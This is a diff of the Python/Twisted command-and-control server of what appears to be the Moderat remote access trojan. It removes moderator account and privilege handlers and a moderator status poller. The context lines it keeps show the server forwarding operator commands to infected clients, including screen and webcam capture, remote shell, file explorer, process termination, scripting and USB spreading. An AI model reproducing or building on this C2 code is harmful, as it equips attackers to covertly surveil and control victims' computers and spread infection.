@@ -249,15 +249,6 @@ class ModeratServerProtocol(LineReceiver):
                     self.factory.log.critical('[MALFORMED][TYPE] [MODE: {0}] [TYPE: {1}]'.format(mode, type(payload)))
 
             # ADMIN PRIVILEGES
-            # Add Moderator
-            elif self.mode == 'addModerator' and self.factory.database.isAdministrator(moderator.username):
-                credentials = self.payload.split()
-                if len(credentials) == 3 and credentials[2].isdigit():
-                    username, password, privileges = credentials
-                    self.factory.database.createModerator(username, password, int(privileges))
-                    self.factory.log.debug('[MODERATOR][{0}] ({1}) Created With Password: ({2}), Privileges: ({3})'.format(
-                        moderator.username, username, password.replace(password[3:], '***'), privileges))
-
             elif self.mode == 'setModerator' and self.factory.database.isAdministrator(moderator.username):
                 credentials = self.payload.split()
                 if len(credentials) == 2:
@@ -266,34 +257,12 @@ class ModeratServerProtocol(LineReceiver):
                     self.factory.log.debug('[MODERATOR][{0}] Moderator Changed For Client ({1}) to ({2})'.format(
                         moderator.username, client_id, moderator_id))
 
-            elif self.mode == 'changePassword' and self.factory.database.get_privs(moderator.username) == 1:
-                credentials = self.payload.split()
-                if len(credentials) == 2:
-                    moderator_id, new_password = credentials
-                    self.factory.database.change_password(moderator_id, new_password)
-                    self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Password Changed to ({2})'.format(
-                        moderator.username, moderator_id, new_password.replace(new_password[3:], '***')))
-
-            elif self.mode == 'changePrivilege' and self.factory.database.isAdministrator(moderator.username):
-                credentials = self.payload.split()
-                if len(credentials) == 2:
-                    moderator_id, new_privilege = credentials
-                    self.factory.database.changePrivileges(moderator_id, new_privilege)
-                    self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Privilege Changed to ({2})'.format(
-                        moderator.username, moderator_id, new_privilege))
-
-            elif self.mode == 'removeModerator' and self.factory.database.isAdministrator(moderator.username):
-                self.factory.database.deleteModerator(self.payload)
-                self.factory.log.debug('[MODERATOR][{0}] Moderator ({1}) Removed'.format(
-                    moderator.username, self.payload))
-
             # Forward To Client
             elif self.mode in ['getScreen', 'getWebcam', 'clientSettings', 'updateSource', 'p2pMode',
                           'shellMode', 'explorerMode', 'terminateProcess', 'scriptingMode', 'usbSpreading']:
                 try:
                     self.sendMessage(self.factory.clients[self.To]['protocol'], self.payload)
                 except KeyError as e:
-                    print e
                     pass
             else:
                 self.factory.log.warning('[MODERATOR] Malformed Mode [{0}] From [{1}]'.format(self.mode, moderator.username))
@@ -335,10 +304,8 @@ class ModeratServerFactory(ServerFactory):
     def __init__(self):
         self.clientInfoChecker = task.LoopingCall(self.infoChecker)
         self.getClientsChecker = task.LoopingCall(self.clientsChecker)
-        self.getModeratorsChecker = task.LoopingCall(self.moderatorsChecker)
         self.clientInfoChecker.start(5)
         self.getClientsChecker.start(5)
-        self.getModeratorsChecker.start(5)
 
     def infoChecker(self):
         for key in self.clients.keys():
@@ -368,22 +335,6 @@ class ModeratServerFactory(ServerFactory):
                         'last_online': client.last_online.strftime("%Y-%m-%d %H:%M:%S"),
                     }
             self.sendMessage(self.moderators[session]['protocol'], shared_clients, 'getClients', '', '')
-
-    def moderatorsChecker(self):
-        shared_moderators = {}
-        moderators = self.database.getModerators()
-        for moderator in moderators:
-            all_clients_count = self.database.getClients(moderator).count()
-            offline_clients_count = self.database.getOfflineClients(moderator).count()
-            shared_moderators[moderator.username] = {
-                'privileges': moderator.privileges,
-                'offline_clients': offline_clients_count,
-                'online_clients': all_clients_count - offline_clients_count,
-                'status': moderator.status,
-                'last_online': moderator.last_online.strftime("%Y-%m-%d %H:%M:%S"),
-            }
-        for session in self.moderators.keys():
-            self.sendMessage(self.moderators[session]['protocol'], shared_moderators, 'getModerators', '', '')
 
     def sendMessage(self, to, payload, mode, sessionID, moduleID):
         to.sendLine(str({
